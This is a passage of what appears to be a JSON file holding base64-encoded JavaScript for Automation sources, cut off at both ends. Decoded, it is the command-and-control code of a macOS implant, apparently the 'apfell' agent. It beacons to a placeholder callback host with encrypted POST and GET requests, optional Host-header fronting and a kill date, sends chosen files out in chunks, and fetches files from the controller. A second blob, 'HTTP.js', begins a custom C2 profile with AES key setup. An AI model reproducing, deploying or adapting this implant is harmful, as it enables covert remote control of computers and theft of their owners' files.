W5kRGF0YSkpOwogICAgICAgIH1lbHNlIGlmKHR5cGVvZihzZW5kRGF0YSkgPT09ICJzdHJpbmciKXsKICAgICAgICAJZGF0YSA9ICQodWlkICsgc2VuZERhdGEpLmRhdGFVc2luZ0VuY29kaW5nKCQuTlNVVEY4U3RyaW5nRW5jb2RpbmcpOwogICAgICAgICAgICBkYXRhID0gZGF0YS5iYXNlNjRFbmNvZGVkU3RyaW5nV2l0aE9wdGlvbnMoMCk7CiAgICAgICAgfWVsc2V7CiAgICAgICAgCWRhdGEgPSAkKHVpZCArIEpTT04uc3RyaW5naWZ5KHNlbmREYXRhKSkuZGF0YVVzaW5nRW5jb2RpbmcoJC5OU1VURjhTdHJpbmdFbmNvZGluZyk7CiAgICAgICAgICAgIGRhdGEgPSBkYXRhLmJhc2U2NEVuY29kZWRTdHJpbmdXaXRoT3B0aW9ucygwKTsKCQl9CgkJd2hpbGUodHJ1ZSl7CgkJCXRyeXsgLy9mb3Igc29tZSByZWFzb24gaXQgc29tZXRpbWVzIHJhbmRvbWx5IGZhaWxzIHRvIHNlbmQgdGhlIGRhdGEsIHRocm93aW5nIGEgSlNPTiBlcnJvci4gbG9vcCB0byBmaXggZm9yIG5vdwoJCQkJLy9jb25zb2xlLmxvZygicG9zdGluZzogIiArIHNlbmREYXRhICsgIiB0byAiICsgdXJsRW5kaW5nKTsKCQkJCWlmKCAkLk5TRGF0ZS5kYXRlLmNvbXBhcmUodGhpcy5raWxsX2RhdGUpID09PSAkLk5TT3JkZXJlZERlc2NlbmRpbmcgKXsKCQkJCSAgJC5OU0FwcGxpY2F0aW9uLnNoYXJlZEFwcGxpY2F0aW9uLnRlcm1pbmF0ZSh0aGlzKTsKCQkJCX0KCQkJCWlmKCAoYXBmZWxsLmlkID09PSB1bmRlZmluZWQgfHwgYXBmZWxsLmlkID09PSAiIikgJiYgKHVpZCA9PT0gdW5kZWZpbmVkIHx8IHVpZCA9PT0gIiIpKXsgJC5OU0FwcGxpY2F0aW9uLnNoYXJlZEFwcGxpY2F0aW9uLnRlcm1pbmF0ZSh0aGlzKTt9CgkJCQlsZXQgcmVxID0gJC5OU011dGFibGVVUkxSZXF1ZXN0LmFsbG9jLmluaXRXaXRoVVJMKCQuTlNVUkwuVVJMV2l0aFN0cmluZyh1cmwpKTsKCQkJCXJlcS5zZXRIVFRQTWV0aG9kKCQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhVVEY4U3RyaW5nKCJQT1NUIikpOwoJCQkJbGV0IHBvc3REYXRhID0gZGF0YS5kYXRhVXNpbmdFbmNvZGluZ0FsbG93TG9zc3lDb252ZXJzaW9uKCQuTlNTdHJpbmcuTlNBU0NJSVN0cmluZ0VuY29kaW5nLCB0cnVlKTsKCQkJCWxldCBwb3N0TGVuZ3RoID0gJC5OU1N0cmluZy5zdHJpbmdXaXRoRm9ybWF0KCIlZCIsIHBvc3REYXRhLmxlbmd0aCk7CgkJCQlyZXEuYWRkVmFsdWVGb3JIVFRQSGVhZGVyRmllbGQocG9zdExlbmd0aCwgJC5OU1N0cmluZy5hbGxvYy5pbml0V2l0aFVURjhTdHJpbmcoJ0NvbnRlbnQtTGVuZ3RoJykpOwoJCQkJaWYoIHRoaXMuaG9zdF9oZWFkZXIubGVuZ3RoID4gMCl7CgkJCQkgICAgcmVxLnNldFZhbHVlRm9ySFRUUEhlYWRlckZpZWxkKCQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhVVEY4U3RyaW5nKHRoaXMuaG9zdF9oZWFkZXIpLCAkLk5TU3RyaW5nLmFsbG9jLmluaXRXaXRoVVRGOFN0cmluZygiSG9zdCIpKTsKCQkJCX0KCQkJCWlmICh0aGlzLnVzZXJfYWdlbnQubGVuZ3RoID4gMCl7CgkJCQkJcmVxLnNldFZhbHVlRm9ySFRUUEhlYWRlckZpZWxkKCQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhVVEY4U3RyaW5nKHRoaXMudXNlcl9hZ2VudCksICQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhVVEY4U3RyaW5nKCJVc2VyLUFnZW50IikpOwoJCQkJfQoJCQkJcmVxLnNldEhUVFBCb2R5KHBvc3REYXRhKTsKCQkJCWxldCByZXNwb25zZSA9IFJlZigpOwoJCQkJbGV0IGVycm9yID0gUmVmKCk7CgkJCQlsZXQgcmVzcG9uc2VEYXRhID0gJC5OU1VSTENvbm5lY3Rpb24uc2VuZFN5bmNocm9ub3VzUmVxdWVzdFJldHVybmluZ1Jlc3BvbnNlRXJyb3IocmVxLHJlc3BvbnNlLGVycm9yKTsKCQkJCS8vcmVzcG9uc2VEYXRhIGlzIGJhc2U2NChVVUlEICsgZGF0YSkKCQkJCWlmKCByZXNwb25zZURhdGEubGVuZ3RoIDwgMzYpewoJCQkJCSQuTlNUaHJlYWQuc2xlZXBGb3JUaW1lSW50ZXJ2YWwodGhpcy5nZW5fc2xlZXBfdGltZSgpKTsKCQkJICAgIAljb250aW51ZTsKCQkJCX0KCQkJCWxldCByZXNwID0gJC5OU0RhdGEuYWxsb2MuaW5pdFdpdGhCYXNlNjRFbmNvZGluZyhyZXNwb25zZURhdGEpOwoJCQkJLy9sZXQgdXVpZF9yYW5nZSA9ICQuTlNNYWtlUmFuZ2UoMCwgMzYpOwoJCSAgICAgICAgbGV0IG1lc3NhZ2VfcmFuZ2UgPSAkLk5TTWFrZVJhbmdlKDM2LCByZXNwLmxlbmd0aCAtIDM2KTsKCQkgICAgICAgIC8vbGV0IHV1aWQgPSAkLk5TU3RyaW5nLmFsbG9jLmluaXRXaXRoRGF0YUVuY29kaW5nKHJlc3Auc3ViZGF0YVdpdGhSYW5nZSh1dWlkX3JhbmdlKSwgJC5OU1VURjhTdHJpbmdFbmNvZGluZykuanM7CgkJICAgICAgICByZXNwID0gcmVzcC5zdWJkYXRhV2l0aFJhbmdlKG1lc3NhZ2VfcmFuZ2UpOyAvL2NvdWxkIGVpdGhlciBiZSBwbGFpbnRleHQganNvbiBvciBlbmNyeXB0ZWQgYnl0ZXMKCQkJCS8vd2UncmUgbm90IGRvaW5nIHRoZSBpbml0aWFsIGtleSBleGNoYW5nZQoJCQkJaWYodGhpcy5hZXNfcHNrICE9PSAiIil7CgkJCQkJLy9pZiB3ZSBkbyBuZWVkIHRvIGRlY3J5cHQgdGhlIHJlc3BvbnNlIHRob3VnaCwgZG8gdGhhdAoJCQkJCWlmKGpzb24pewoJCQkJCQlyZXNwID0gT2JqQy51bndyYXAodGhpcy5kZWNyeXB0X21lc3NhZ2UocmVzcCkpOwoJCQkJCQlyZXR1cm4gSlNPTi5wYXJzZShyZXNwKTsKCQkJCQl9ZWxzZXsKCQkJCQkJcmV0dXJuIHRoaXMuZGVjcnlwdF9tZXNzYWdlKHJlc3ApOwoJCQkJCX0KCQkJCX1lbHNlewoJCQkJCS8vd2UgZG9uJ3QgbmVlZCB0byBkZWNyeXB0IGl0LCBzbyB3ZSBjYW4ganVzdCBwYXJzZSBhbmQgcmV0dXJuIGl0CgkJCQkJaWYoanNvbil7CgkJCQkJCXJldHVybiBKU09OLnBhcnNlKE9iakMuZGVlcFVud3JhcCgkLk5TU3RyaW5nLmFsbG9jLmluaXRXaXRoRGF0YUVuY29kaW5nKHJlc3AsICQuTlNVVEY4U3RyaW5nRW5jb2RpbmcpKSk7CgkJCQkJfWVsc2V7CgkJCQkJCXJldHVybiAkLk5TU3RyaW5nLmFsbG9jLmluaXRXaXRoRGF0YUVuY29kaW5nKHJlc3AsICQuTlNVVEY4U3RyaW5nRW5jb2RpbmcpLmpzOwoJCQkJCX0KCQkJCX0KCQkJfQoJCQljYXRjaChlcnJvcil7CgkJCQkvL2NvbnNvbGUubG9nKGVycm9yLnRvU3RyaW5nKCkpOwoJCQkgICAgJC5OU1RocmVhZC5zbGVlcEZvclRpbWVJbnRlcnZhbCh0aGlzLmdlbl9zbGVlcF90aW1lKCkpOyAgLy8gZG9uJ3Qgc3BpbiBvdXQgY3JhenkgaWYgdGhlIGNvbm5lY3Rpb24gZmFpbHMKCQkJfQoJCX0KCX0KCWh0bWxHZXREYXRhKHVybCl7CgkJbGV0IGRhdGEgPSB7InRhc2tpbmdfc2l6ZSI6MSwgImFjdGlvbiI6ICJnZXRfdGFza2luZyJ9OwoJCWlmKHRoaXMuYWVzX3BzayAhPT0gIiIpewoJCQlkYXRhID0gdGhpcy5lbmNyeXB0X21lc3NhZ2UoYXBmZWxsLmlkLCBKU09OLnN0cmluZ2lmeShkYXRhKSkuanM7CgkJfWVsc2V7CgkJCWRhdGEgPSAkKGFwZmVsbC5pZCArIEpTT04uc3RyaW5naWZ5KGRhdGEpKS5kYXRhVXNpbmdFbmNvZGluZygkLk5TVVRGOFN0cmluZ0VuY29kaW5nKTsKCQkJZGF0YSA9IGRhdGEuYmFzZTY0RW5jb2RlZFN0cmluZ1dpdGhPcHRpb25zKDApLmpzOwoJCX0KCQlsZXQgTlNDaGFyYWN0ZXJTZXQgPSAkLk5TQ2hhcmFjdGVyU2V0LmNoYXJhY3RlclNldFdpdGhDaGFyYWN0ZXJzSW5TdHJpbmcoIi8rPVxuIikuaW52ZXJ0ZWRTZXQ7CgkJZGF0YSA9ICQoZGF0YSkuc3RyaW5nQnlBZGRpbmdQZXJjZW50RW5jb2RpbmdXaXRoQWxsb3dlZENoYXJhY3RlcnMoTlNDaGFyYWN0ZXJTZXQpLmpzOwoJCXVybCA9IHRoaXMuYmFzZXVybCArIHVybCArICI\/cT0iICsgZGF0YTsKCSAgICB3aGlsZSh0cnVlKXsKCSAgICAgICAgdHJ5ewoJICAgICAgICAJaWYoICQuTlNEYXRlLmRhdGUuY29tcGFyZSh0aGlzLmtpbGxfZGF0ZSkgPT09ICQuTlNPcmRlcmVkRGVzY2VuZGluZyApewoJCQkJICAkLk5TQXBwbGljYXRpb24uc2hhcmVkQXBwbGljYXRpb24udGVybWluYXRlKHRoaXMpOwoJCQkJfQoJICAgICAgICAJaWYoYXBmZWxsLmlkID09PSB1bmRlZmluZWQgfHwgYXBmZWxsLmlkID09PSAiIil7ICQuTlNBcHBsaWNhdGlvbi5zaGFyZWRBcHBsaWNhdGlvbi50ZXJtaW5hdGUodGhpcyk7fQoJICAgICAgICAgICAgbGV0IHJlcSA9ICQuTlNNdXRhYmxlVVJMUmVxdWVzdC5hbGxvYy5pbml0V2l0aFVSTCgkLk5TVVJMLlVSTFdpdGhTdHJpbmcodXJsKSk7CiAgICAgICAgICAgICAgICByZXEuc2V0SFRUUE1ldGhvZCgkLk5TU3RyaW5nLmFsbG9jLmluaXRXaXRoVVRGOFN0cmluZygiR0VUIikpOwogICAgICAgICAgICAgICAgaWYoIHRoaXMuaG9zdF9oZWFkZXIubGVuZ3RoID4gMCl7CiAgICAgICAgICAgICAgICAgICAgcmVxLnNldFZhbHVlRm9ySFRUUEhlYWRlckZpZWxkKCQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhVVEY4U3RyaW5nKHRoaXMuaG9zdF9oZWFkZXIpLCAkLk5TU3RyaW5nLmFsbG9jLmluaXRXaXRoVVRGOFN0cmluZygiSG9zdCIpKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICh0aGlzLnVzZXJfYWdlbnQubGVuZ3RoID4gMCl7CgkJCQkJcmVxLnNldFZhbHVlRm9ySFRUUEhlYWRlckZpZWxkKCQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhVVEY4U3RyaW5nKHRoaXMudXNlcl9hZ2VudCksICQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhVVEY4U3RyaW5nKCJVc2VyLUFnZW50IikpOwoJCQkJfQogICAgICAgICAgICAgICAgbGV0IHJlc3BvbnNlID0gUmVmKCk7CiAgICAgICAgICAgICAgICBsZXQgZXJyb3IgPSBSZWYoKTsKICAgICAgICAgICAgICAgIGxldCByZXNwb25zZURhdGEgPSAkLk5TVVJMQ29ubmVjdGlvbi5zZW5kU3luY2hyb25vdXNSZXF1ZXN0UmV0dXJuaW5nUmVzcG9uc2VFcnJvcihyZXEscmVzcG9uc2UsZXJyb3IpOwoJCQkJaWYocmVzcG9uc2VEYXRhLmxlbmd0aCA8IDM2KXsKICAgICAgICAgICAgICAgICAgICAvL3RoaXMgbWVhbnMgd2UgbGlrZWx5IGdvdCBiYWNrIHNvbWUgZm9ybSBvZiBlcnJvciBvciByZWRpcmVjdCBtZXNzYWdlLCBub3Qgb3VyIGFjdHVhbCBkYXRhCiAgICAgICAgICAgICAgICAgICAgJC5OU1RocmVhZC5zbGVlcEZvclRpbWVJbnRlcnZhbCh0aGlzLmdlbl9zbGVlcF90aW1lKCkpOwogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfQoJCQkJbGV0IHJlc3AgPSAkLk5TRGF0YS5hbGxvYy5pbml0V2l0aEJhc2U2NEVuY29kaW5nKHJlc3BvbnNlRGF0YSk7CgkJCQkvL2xldCB1dWlkX3JhbmdlID0gJC5OU01ha2VSYW5nZSgwLCAzNik7CgkJICAgICAgICBsZXQgbWVzc2FnZV9yYW5nZSA9ICQuTlNNYWtlUmFuZ2UoMzYsIHJlc3AubGVuZ3RoIC0gMzYpOwoJCSAgICAgICAgLy9sZXQgdXVpZCA9ICQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhEYXRhRW5jb2RpbmcocmVzcC5zdWJkYXRhV2l0aFJhbmdlKHV1aWRfcmFuZ2UpLCAkLk5TVVRGOFN0cmluZ0VuY29kaW5nKS5qczsKCQkgICAgICAgIHJlc3AgPSByZXNwLnN1YmRhdGFXaXRoUmFuZ2UobWVzc2FnZV9yYW5nZSk7IC8vY291bGQgZWl0aGVyIGJlIHBsYWludGV4dCBqc29uIG9yIGVuY3J5cHRlZCBieXRlcwoJCQkJLy93ZSdyZSBub3QgZG9pbmcgdGhlIGluaXRpYWwga2V5IGV4Y2hhbmdlCgkJCQlpZih0aGlzLmFlc19wc2sgIT09ICIiKXsKCQkJCQkvL2lmIHdlIGRvIG5lZWQgdG8gZGVjcnlwdCB0aGUgcmVzcG9uc2UgdGhvdWdoLCBkbyB0aGF0CgkJCQkJcmVzcCA9IE9iakMudW53cmFwKHRoaXMuZGVjcnlwdF9tZXNzYWdlKHJlc3ApKTsKCQkJCQlyZXR1cm4gSlNPTi5wYXJzZShyZXNwKTsKCQkJCX1lbHNlewoJCQkJCS8vd2UgZG9uJ3QgbmVlZCB0byBkZWNyeXB0IGl0LCBzbyB3ZSBjYW4ganVzdCBwYXJzZSBhbmQgcmV0dXJuIGl0CgkJCQkJcmV0dXJuIEpTT04ucGFyc2UoT2JqQy5kZWVwVW53cmFwKCQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhEYXRhRW5jb2RpbmcocmVzcCwgJC5OU1VURjhTdHJpbmdFbmNvZGluZykpKTsKCQkJCX0KCSAgICAgICAgfQoJICAgICAgICBjYXRjaChlcnJvcil7CgkgICAgICAgICAgICAvL2NvbnNvbGUubG9nKCJlcnJvciBpbiBodG1sR2V0RGF0YTogIiArIGVycm9yLnRvU3RyaW5nKCkpOwoJICAgICAgICAgICAgJC5OU1RocmVhZC5zbGVlcEZvclRpbWVJbnRlcnZhbCh0aGlzLmdlbl9zbGVlcF90aW1lKCkpOyAvL3dhaXQgdGltZW91dCBzZWNvbmRzIGFuZCB0cnkgYWdhaW4KCSAgICAgICAgfQoJICAgIH0KCX0KCWRvd25sb2FkKHRhc2ssIHBhcmFtcyl7CiAgICAgICAgLy8gZG93bmxvYWQganVzdCBoYXMgb25lIHBhcmFtZXRlciBvZiB0aGUgcGF0aCBvZiB0aGUgZmlsZSB0byBkb3dubG9hZAogICAgICAgIGxldCBvdXRwdXQgPSAiIjsKCQlpZiggZG9lc19maWxlX2V4aXN0KHBhcmFtcykgKXsKICAgICAgICAgICAgbGV0IG9mZnNldCA9IDA7CiAgICAgICAgICAgIGxldCBjaHVua1NpemUgPSA1MTIwMDA7IC8vMzUwMDsKICAgICAgICAgICAgLy8gZ2V0IHRoZSBmdWxsIHJlYWwgcGF0aCB0byB0aGUgZmlsZQogICAgICAgICAgICBsZXQgZnVsbF9wYXRoID0gcGFyYW1zOwogICAgICAgICAgICB0cnl7CiAgICAgICAgICAgIAlsZXQgZm0gPSAkLk5TRmlsZU1hbmFnZXIuZGVmYXVsdE1hbmFnZXI7CiAgICAgICAgICAgIAlsZXQgcGllY2VzID0gT2JqQy5kZWVwVW53cmFwKGZtLmNvbXBvbmVudHNUb0Rpc3BsYXlGb3JQYXRoKHBhcmFtcykpOwogICAgICAgICAgICAJZnVsbF9wYXRoID0gIi8iICsgcGllY2VzLnNsaWNlKDEpLmpvaW4oIi8iKTsKICAgICAgICAgICAgICAgIHZhciBoYW5kbGUgPSAkLk5TRmlsZUhhbmRsZS5maWxlSGFuZGxlRm9yUmVhZGluZ0F0UGF0aChmdWxsX3BhdGgpOwogICAgICAgICAgICAgICAgLy8gR2V0IHRoZSBmaWxlIHNpemUgYnkgc2Vla2luZzsKICAgICAgICAgICAgICAgIHZhciBmaWxlU2l6ZSA9IGhhbmRsZS5zZWVrVG9FbmRPZkZpbGU7CiAgICAgICAgICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgICAgICAgICByZXR1cm4geydzdGF0dXMnOiAnZXJyb3InLCAndXNlcl9vdXRwdXQnOiBlcnJvci50b1N0cmluZygpLCAnY29tcGxldGVkJzogdHJ1ZX07CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLy8gYWx3YXlzIHJvdW5kIHVwIHRvIGFjY291bnQgZm9yIGNodW5rcyB0aGF0IGFyZSA8IGNodW5rc2l6ZTsKICAgICAgICAgICAgbGV0IG51bU9mQ2h1bmtzID0gTWF0aC5jZWlsKGZpbGVTaXplIC8gY2h1bmtTaXplKTsKICAgICAgICAgICAgbGV0IHJlZ2lzdGVyRGF0YSA9IHsndG90YWxfY2h1bmtzJzogbnVtT2ZDaHVua3MsICdmdWxsX3BhdGgnOiBmdWxsX3BhdGh9OwogICAgICAgICAgICBsZXQgcmVnaXN0ZXJGaWxlID0gdGhpcy5wb3N0UmVzcG9uc2UodGFzaywgcmVnaXN0ZXJEYXRhKTsKICAgICAgICAgICAgcmVnaXN0ZXJGaWxlID0gcmVnaXN0ZXJGaWxlWydyZXNwb25zZXMnXVswXTsKICAgICAgICAgICAgaWYgKHJlZ2lzdGVyRmlsZVsnc3RhdHVzJ10gPT09ICJzdWNjZXNzIil7CiAgICAgICAgICAgICAgICBoYW5kbGUuc2Vla1RvRmlsZU9mZnNldCgwKTsKICAgICAgICAgICAgICAgIGxldCBjdXJyZW50Q2h1bmsgPSAxOwogICAgICAgICAgICAgICAgbGV0IGRhdGEgPSBoYW5kbGUucmVhZERhdGFPZkxlbmd0aChjaHVua1NpemUpOwogICAgICAgICAgICAgICAgd2hpbGUocGFyc2VJbnQoZGF0YS5sZW5ndGgpID4gMCAmJiBvZmZzZXQgPCBmaWxlU2l6ZSl7CiAgICAgICAgICAgICAgICAgICAgLy8gc2VuZCBhIGNodW5rCiAgICAgICAgICAgICAgICAgICAgbGV0IGZpbGVEYXRhID0geydjaHVua19udW0nOiBjdXJyZW50Q2h1bmssICdjaHVua19kYXRhJzogZGF0YS5iYXNlNjRFbmNvZGVkU3RyaW5nV2l0aE9wdGlvbnMoMCkuanMsJ2ZpbGVfaWQnOiByZWdpc3RlckZpbGVbJ2ZpbGVfaWQnXX07CiAgICAgICAgICAgICAgICAgICAgdGhpcy5wb3N0UmVzcG9uc2UodGFzaywgZmlsZURhdGEpOwogICAgICAgICAgICAgICAgICAgICQuTlNUaHJlYWQuc2xlZXBGb3JUaW1lSW50ZXJ2YWwodGhpcy5nZW5fc2xlZXBfdGltZSgpKTsKICAgICAgICAgICAgICAgICAgICAvLyBpbmNyZW1lbnQgdGhlIG9mZnNldCBhbmQgc2VlayB0byB0aGUgYW1vdW50IG9mIGRhdGEgcmVhZCBmcm9tIHRoZSBmaWxlCiAgICAgICAgICAgICAgICAgICAgb2Zmc2V0ICs9IHBhcnNlSW50KGRhdGEubGVuZ3RoKTsKICAgICAgICAgICAgICAgICAgICBoYW5kbGUuc2Vla1RvRmlsZU9mZnNldChvZmZzZXQpOwogICAgICAgICAgICAgICAgICAgIGN1cnJlbnRDaHVuayArPSAxOwogICAgICAgICAgICAgICAgICAgIGRhdGEgPSBoYW5kbGUucmVhZERhdGFPZkxlbmd0aChjaHVua1NpemUpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgb3V0cHV0ID0geyJjb21wbGV0ZWQiOnRydWUsICJmaWxlX2lkIjogcmVnaXN0ZXJGaWxlWydmaWxlX2lkJ119OwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgIG91dHB1dCA9IHsnc3RhdHVzJzogJ2Vycm9yJywgJ3VzZXJfb3V0cHV0JzogIkZhaWxlZCB0byByZWdpc3RlciBmaWxlIHRvIGRvd25sb2FkIiwgJ2NvbXBsZXRlZCc6IHRydWV9OwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2V7CiAgICAgICAgICAgIG91dHB1dCA9IHsnc3RhdHVzJzogJ2Vycm9yJywgJ3VzZXJfb3V0cHV0JzogImZpbGUgZG9lcyBub3QgZXhpc3QiLCAnY29tcGxldGVkJzogdHJ1ZX07CiAgICAgICAgfQogICAgICAgIHJldHVybiBvdXRwdXQ7Cgl9Cgl1cGxvYWQodGFzaywgZmlsZV9pZCwgZnVsbF9wYXRoKXsKCSAgICB0cnl7CiAgICAgICAgICAgIGxldCBkYXRhID0geyJhY3Rpb24iOiAidXBsb2FkIiwgImZpbGVfaWQiOiBmaWxlX2lkLCAiY2h1bmtfc2l6ZSI6IDUxMjAwMCwgImNodW5rX251bSI6IDEsICJmdWxsX3BhdGgiOiBmdWxsX3BhdGgsICJ0YXNrX2lkIjogdGFzay5pZH07CiAgICAgICAgICAgIGxldCBjaHVua19udW0gPSAxOwogICAgICAgICAgICBsZXQgdG90YWxfY2h1bmtzID0gMTsKICAgICAgICAgICAgbGV0IHRvdGFsX2RhdGEgPSAkLk5TTXV0YWJsZURhdGEuZGF0YVdpdGhMZW5ndGgoMCk7CiAgICAgICAgICAgIGRvewogICAgICAgICAgICAJbGV0IGZpbGVfZGF0YSA9IHRoaXMuaHRtbFBvc3REYXRhKHRoaXMudXJsLCBkYXRhLCBhcGZlbGwuaWQpOwogICAgICAgICAgICAJaWYoZmlsZV9kYXRhWydjaHVua19udW0nXSA9PT0gMCl7CiAgICAgICAgICAgIAkJcmV0dXJuICJlcnJvciBmcm9tIHNlcnZlciI7CiAgICAgICAgICAgIAl9CiAgICAgICAgICAgIAljaHVua19udW0gPSBmaWxlX2RhdGFbJ2NodW5rX251bSddOwogICAgICAgICAgICAJdG90YWxfY2h1bmtzID0gZmlsZV9kYXRhWyd0b3RhbF9jaHVua3MnXTsKICAgICAgICAgICAgCXRvdGFsX2RhdGEuYXBwZW5kRGF0YSgkLk5TRGF0YS5hbGxvYy5pbml0V2l0aEJhc2U2NEVuY29kaW5nKCQoZmlsZV9kYXRhWydjaHVua19kYXRhJ10pKSk7CiAgICAgICAgICAgIAlkYXRhID0geyJhY3Rpb24iOiAidXBsb2FkIiwgImZpbGVfaWQiOiBmaWxlX2lkLCAiY2h1bmtfc2l6ZSI6IDUxMjAwMCwgImNodW5rX251bSI6IGNodW5rX251bSArIDF9OwogICAgICAgICAgICB9d2hpbGUoY2h1bmtfbnVtIDwgdG90YWxfY2h1bmtzKTsKICAgICAgICAgICAgcmV0dXJuIHRvdGFsX2RhdGE7CgkgICAgfWNhdGNoKGVycm9yKXsKCSAgICAgICAgcmV0dXJuIGVycm9yLnRvU3RyaW5nKCk7CgkgICAgfQoJfQp9Ci8vLS0tLS0tLS0tLS0tLSBJTlNUQU5USUFURSBPVVIgQzIgQ0xBU1MgQkVMT1cgSEVSRSBJTiBNQUlOIENPREUtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpPYmpDLmltcG9ydCgnU2VjdXJpdHknKTsKdmFyIEMyID0gbmV3IGN1c3RvbUMyKGNhbGxiYWNrX2ludGVydmFsLCAiY2FsbGJhY2tfaG9zdDpjYWxsYmFja19wb3J0LyIpOw=="
          }
        ],
        "HTTP": [
          {
            "HTTP.js": "Ly8tLS0tLS0tLS0tLS0tUkVTVEZVTCBDMiBtZWNoYW5pc21zIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpjbGFzcyBjdXN0b21DMiBleHRlbmRzIGJhc2VDMnsKCgljb25zdHJ1Y3RvcihpbnRlcnZhbCwgYmFzZXVybCl7CgkJc3VwZXIoaW50ZXJ2YWwsIGJhc2V1cmwpOwoJCXRoaXMuY29tbWFuZHMgPSBbXTsKCQl0aGlzLmMyX2NvbmZpZyA9IHJhd19jMl9jb25maWc7CgkJdGhpcy5nZXRfbWVzc2FnZXMgPSB0aGlzLmMyX2NvbmZpZ1snR0VUJ11bJ0FnZW50TWVzc2FnZSddOwogICAgICAgIHRoaXMucG9zdF9tZXNzYWdlcyA9IHRoaXMuYzJfY29uZmlnWydQT1NUJ11bJ0FnZW50TWVzc2FnZSddOwogICAgICAgIHRoaXMuaW50ZXJ2YWwgPSB0aGlzLmMyX2NvbmZpZ1snaW50ZXJ2YWwnXTsKICAgICAgICB0aGlzLmNodW5rX3NpemUgPSB0aGlzLmMyX2NvbmZpZ1snY2h1bmtfc2l6ZSddOwogICAgICAgIHRoaXMuaml0dGVyID0gdGhpcy5jMl9jb25maWdbJ2ppdHRlciddOwogICAgICAgIHRoaXMuYWVzX3BzayA9ICJBRVNQU0siOyAvLyBiYXNlNjQgZW5jb2RlZCBrZXkKICAgICAgICBpZih0aGlzLmFlc19wc2sgIT09ICIiKXsKCQkgICAgdGhpcy5wYXJhbWV0ZXJzID0gJC5DRkRpY3Rpb25hcnlDcmVhdGVNdXRhYmxlKCQua0NGQWxsb2NhdG9yRGVmYXVsdCwgMCwgJC5rQ0ZUeXBlRGljdGlvbmFyeUtleUNhbGxCYWNrcywgJC5rQ0ZUeXBlRGljdGlvbmFyeVZhbHVlQ2FsbEJhY2tzKTsKCQkgICAgJC5DRkRpY3Rpb25hcnlTZXRWYWx1ZSh0aGlzLnBhcmFtZXRlcnMsICQua1NlY0F0dHJLZXlUeXBlLCAkLmtTZWNBdHRyS2V5VHlwZUFFUyk7CgkJICAgICQuQ0ZEaWN0aW9uYXJ5U2V0VmFsdWUodGhpcy5wYXJhbWV0ZXJzLCAkLmtTZWNBdHRyS2V5U2l6ZUluQml0cywgJC5rU2VjQUVTMjU2KTsKCQkgICAgJC5DRkRpY3Rpb25hcnlTZXRWYWx1ZSh0aGlzLnBhcmFtZXRlcnMsICQua1NlY0F0dHJLZXlDbGFzcywgJC5rU2VjQXR0cktleUNsYXNzU3ltbWV0cmljKTsKCQkgICAgJC5DRkRpY3Rpb25hcnlTZXRWYWx1ZSh0aGlzLnBhcmFtZXRlcnMsICQua1NlY0NsYXNzLCAkLmtTZWNDbGFzc0tleSk7CiAgICAgICAgICAgIHRoaXMucmF3X2tleSA9ICQuTlNEYXRhLmFsbG9jLmluaXRXaXRoQmFzZTY0RW5jb2RpbmcodGhpcy5hZXNfcHNrKTsKICAgICAgICAgICAgbGV0IGVyciA9IFJlZigpOwogICAgICAgICAgICB0aGlzLmNyeXB0b2tleSA9ICQuU2VjS2V5Q3JlYXRlRnJvbURhdGEodGhpcy5wYXJhbWV0ZXJzLCB0aGlzLnJhd19rZXksIGVycik7CgkJfQogICAgICAgIHRoaXMudXNpbmdfa2V5X2V4Y2hhbmdlID0gdGhpcy5jMl9jb25maWdbJ2tleV9leGNoYW5nZSddOwogICAgICAgIHRoaXMuZXhjaGFuZ2luZ19rZXlzID0gdGhpcy51c2luZ19rZXlfZXhjaGFuZ2U7CiAgICAgICAgdGhpcy5kYXRlRm9ybWF0dGVyID0gJC5OU0RhdGVGb3JtYXR0ZXIuYWxsb2MuaW5pdDsKICAgICAgICB0aGlzLmRhdGVGb3JtYXR0ZXIuc2V0RGF0ZUZvcm1hdCgieXl5eS1NTS1kZCIpOwogICAgICAgIGlmKHRoaXMuYzJfY29uZmlnWydraWxsX2RhdGUnXSAhPT0gdW5kZWZpbmVkICYmIHRoaXMuYzJfY29uZmlnWydraWxsX2RhdGUnXSAhPT0gIiIpewogICAgICAgICAgICB0aGlzLmtpbGxfZGF0ZSA9IHRoaXMuZGF0ZUZvcm1hdHRlci5kYXRlRnJvbVN0cmluZyh0aGlzLmMyX2NvbmZpZ1sna2lsbF9kYXRlJ10pOwogICAgICAgIH1lbHNlewogICAgICAgICAgICB0aGlzLmtpbGxfZGF0ZSA9ICQuTlNEYXRlLmRpc3RhbnRGdXR1cmU7CiAgICAgICAgfQoJfQogICAgZ2V0X3JhbmRvbV9lbGVtZW50KHgpewoJICAgIHJldHVybiB4W01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIHgubGVuZ3RoKV07CiAgICB9CgllbmNyeXB0X21lc3NhZ2UodWlkLCBkYXRhKXsKCSAgICAvLyB0YWtlcyBpbiB0aGUgc3RyaW5nIHdlJ3JlIGFib3V0IHRvIHNlbmQsIGVuY3J5cHRzIGl0LCBhbmQgcmV0dXJucyBhIG5ldyBzdHJpbmcKCSAgICBsZXQgZXJyID0gUmVmKCk7CgkgICAgbGV0IGVuY3J5cHQgPSAkLlNlY0VuY3J5cHRUcmFuc2Zvcm1DcmVhdGUodGhpcy5jcnlwdG9rZXksZXJyKTsKCSAgICBsZXQgYiA9ICQuU2VjVHJhbnNmb3JtU2V0QXR0cmlidXRlKGVuY3J5